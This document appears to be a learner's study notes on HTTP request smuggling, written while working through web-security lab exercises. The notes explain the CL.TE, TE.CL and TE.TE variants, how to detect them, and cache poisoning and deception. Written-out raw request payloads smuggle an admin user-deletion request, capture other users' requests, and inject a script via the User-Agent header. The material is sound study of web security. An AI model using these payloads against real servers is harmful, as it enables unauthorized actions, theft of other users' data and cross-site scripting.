HTTP Request Smuggling:
	It is crucial that the fornt end and backend systems agree about the boundaries between requests otherwise the attacker might able to send an ambigiour request that gets interpreted differently by the front end and back end systems

	a attacker can cause part of their front end request to be interpreted by the backend server as start of the next request. it is efferctively prepended to the next request and so can interfere with the way the application processes that request.

	vulnerabilities arise because the HTTP specification provides two different ways to specify where a request ends

	Content-Length
		it specifies the length of the message body in bytes
	POST /test HTTP/1.1
	host: test.com
	content-Type: application/plain
	Content-Length: 11

	q=smuggling
		
	Transfer-Encoding
		it is used to specify that the message body uses chunked encoding. this means that the message body contains one or more chucks of data. each chuck consists fo the chunk size in bytes(expressed in hexadecimal), followed by a newline, follwed by the chunk contents. the message is terminated with a chuck of size zero 

	Post /test HTTP/1.1
	Host: test.com
	Content-Type: application/plain
	Transfer-Encoding: chunked

	b
	q=smuggling
	0

the issue arises when both the headers are used in a request, as standard if both are there, content-lenght header is ignored, but 

most servers do not support the transder encodng header in request
thus making front end and back end servers behave diffrenetly 

CL.TE: the front end server uses the content lenght header and the backend server uses the transfer encoding header

TE.CL: the front end server uses the Transfer-encoding header and the backend uses the content-length header

TE.TE: the front and back both support transfer-encoding header , but one of the servers can be induced not to process it by obfuscating the header in some way.

Content-Length: 26 // this take home body size 
Transfer-Encoding: chunked

0 //back end take this and ends the request body here and places the rest of the body in the next incoming request

GET / HTTP/1.1
X: XX

Finding methods:
send  a request with no ending '0' thus the server will wait for the next chunk, thus causing a noticble difference

send a request with extra content length, thus the back end will wait for the full body to arrive

Transfer-Encoding: chunked\r\n
Content-Length: 4\r\n
\r\n
5d\r\n
GET /test HTTP/1.1\r\n
Host: ac871fd61e3fb1e7800c45f100880027.web-security-academy.net\r\n
Foo: X\r\n
\r\n
0\r\n
\r\n

Content-Length: 77
Transfer-Encoding: chunked

0


GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
X: X

0

Content-Length: 4
Transfer-Encoding: chunked

43
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
X: X

0

some front end server will rewrite the request by adding additional headers, to get those, we can pass the next request to valid post request that spits the value out the sent value in response

Content-Length: 170

Transfer-Encoding: chunked



0



POST / HTTP/1.1
Host: ac3f1f3c1e4005308070012e005500b5.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 110


search=test

the next requests body and headers are appened to the search term

Content-Length: 144
Transfer-Encoding: chunked

0

GET /post?postId=10 HTTP/1.1
Host: aca51ffa1ecd3e7180f38ca7005c00d1.web-security-academy.net
User-Agent: "><script>alert(1)</script>
X:X



	
web cache poisoning: the attacker causes the application to store some malicious content in the cache and the this content is server from the cache to other application users

web cache deception: the attacker causes the application to store some sentivite content belonggin to another user in the cache and the attakcer then retirives this content from the cache

thus allows the attacker to store a diffrent output into the cache for the next static file that is getting loaded inthe intial request

after the atttacker can load the static file to get the output of the smuggled page that was cached instead
